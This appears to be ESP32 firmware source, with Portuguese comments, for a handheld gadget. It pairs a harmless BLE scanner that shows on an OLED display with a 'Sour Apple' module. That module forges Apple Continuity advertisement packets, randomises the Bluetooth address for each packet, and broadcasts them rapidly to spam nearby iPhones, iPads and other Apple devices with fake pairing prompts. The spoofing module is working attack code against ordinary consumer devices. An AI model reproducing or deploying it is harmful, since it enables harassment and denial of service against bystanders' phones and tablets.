#include "config.h"

namespace {
  BLEScan* pBLEScan = nullptr;
  bool bleScanning = false;
  int bleDeviceCount = 0;
  int selectedDevice = 0;
  unsigned long lastBleUpdate = 0;
  String bleNames[20];
  int bleRssi[20];
  int bleAddrType[20];
  int storedBleCount = 0;
  bool bleInitialized = false;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (storedBleCount < 20) {
      String name = String(advertisedDevice.getName().c_str());
      if (name.length() == 0) name = "Unknown";
      bleNames[storedBleCount] = name;
      bleRssi[storedBleCount] = advertisedDevice.getRSSI();
      bleAddrType[storedBleCount] = advertisedDevice.getAddressType();
      storedBleCount++;
    }
  }
};

void bleScanSetup() {
  storedBleCount = 0;
  bleDeviceCount = 0;
  selectedDevice = 0;
  lastBleUpdate = 0;
  bleScanning = false;
  u8g2.clearBuffer();
  drawFunctionHeader("BLE Scanner");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("Iniciando...");
  u8g2.sendBuffer();

  if (!bleInitialized) {
    BLEDevice::init("CrazyCat");
    bleInitialized = true;
  }

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), false);
  BLEScanResults results = pBLEScan->start(3, false);
  bleDeviceCount = storedBleCount;
  bleScanning = true;
  lastBleUpdate = millis();
}

void bleScanLoop() {
  if (buttonPressed(BTN_BACK)) {
    if (pBLEScan) pBLEScan->stop();
    // CORRECAO: Nao chamar BLEDevice::deinit() - causa crash/reboot no ESP32
    // Apenas parar o scan e marcar como nao inicializado
    bleInitialized = false;
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (!bleScanning) return;
  if (millis() - lastBleUpdate > 3000) {
    storedBleCount = 0;
    pBLEScan->clearResults();
    BLEScanResults results = pBLEScan->start(2, false);
    bleDeviceCount = storedBleCount;
    lastBleUpdate = millis();
  }
  u8g2.clearBuffer();
  drawFunctionHeader("BLE Scanner");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 22);
  u8g2.print("BLE Devices: ");
  u8g2.print(bleDeviceCount);
  int start = selectedDevice;
  for (int i = 0; i < 3 && (start + i) < bleDeviceCount; i++) {
    int idx = start + i;
    u8g2.setCursor(0, 34 + (i * 10));
    if (idx == selectedDevice) u8g2.print("> ");
    else u8g2.print("  ");
    String name = bleNames[idx];
    if (name.length() > 12) name = name.substring(0, 12);
    u8g2.print(name);
    u8g2.print(" ");
    u8g2.print(bleRssi[idx]);
  }
  if (bleDeviceCount == 0) {
    u8g2.setCursor(0, 40);
    u8g2.print("Nenhum dispositivo");
    u8g2.setCursor(0, 52);
    u8g2.print("Aguardando...");
  }
  u8g2.sendBuffer();
  if (buttonPressed(BTN_DOWN) && selectedDevice < bleDeviceCount - 1) selectedDevice++;
  if (buttonPressed(BTN_UP) && selectedDevice > 0) selectedDevice--;
}

namespace {
  BLEAdvertising *pAdvertising = nullptr;
  bool appleSpamming = false;
  uint8_t packet[31];
  bool sourAppleInitialized = false;
  int spamCounter = 0;
}

void sourAppleSetup() {
  appleSpamming = false;
  spamCounter = 0;
  u8g2.clearBuffer();
  drawFunctionHeader("Sour Apple");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("SEL: Iniciar/Parar");
  u8g2.sendBuffer();

  if (!sourAppleInitialized) {
    BLEDevice::init("");
    sourAppleInitialized = true;
  }

  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  memset(packet, 0, sizeof(packet));
  packet[0] = 0x1E;
  packet[1] = 0xFF;
  packet[2] = 0x4C;
  packet[3] = 0x00;
  packet[4] = 0x0F;
  packet[5] = 0x05;
  packet[6] = 0xC1;
  packet[7] = 0x27;

  for (int i = 8; i < 31; i++) {
    packet[i] = random(256);
  }
}

void sourAppleLoop() {
  if (buttonPressed(BTN_BACK)) {
    appleSpamming = false;
    if (pAdvertising) pAdvertising->stop();
    // CORRECAO: Nao chamar BLEDevice::deinit() - causa crash/reboot no ESP32
    sourAppleInitialized = false;
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }

  if (buttonPressed(BTN_SELECT)) {
    appleSpamming = !appleSpamming;
    delay(200);
  }

  u8g2.clearBuffer();
  drawFunctionHeader("Sour Apple");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print(appleSpamming ? "Status: SPAMMING" : "Status: PARADO");
  if (appleSpamming) {
    u8g2.setCursor(0, 42);
    u8g2.print("Pkt: ");
    u8g2.print(spamCounter);
    u8g2.setCursor(0, 54);
    const char* devNames[] = {"AirPods", "AirPods Pro", "AirPods Max",
                                "PowerBeats", "Beats Solo", "AppleTV",
                                "HomePod", "iPad", "iPhone", "Watch", "Mac"};
    u8g2.print(devNames[packet[7] % 11]);
  }
  u8g2.sendBuffer();

  if (appleSpamming) {
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    int numTypes = sizeof(types) / sizeof(types[0]);

    packet[7] = types[random(numTypes)];

    uint8_t addr[6];
    for (int i = 0; i < 6; i++) addr[i] = random(256);
    addr[0] |= 0xC0;
    addr[0] &= 0xCF;

    #if defined(CONFIG_BT_BLUEDROID_ENABLED)
      esp_bd_addr_t rand_addr;
      memcpy(rand_addr, addr, 6);
      esp_ble_gap_set_rand_addr(rand_addr);
    #endif

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, 31));
    pAdvertising->setAdvertisementData(advData);

    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
    delay(5);

    spamCounter++;
  }
}
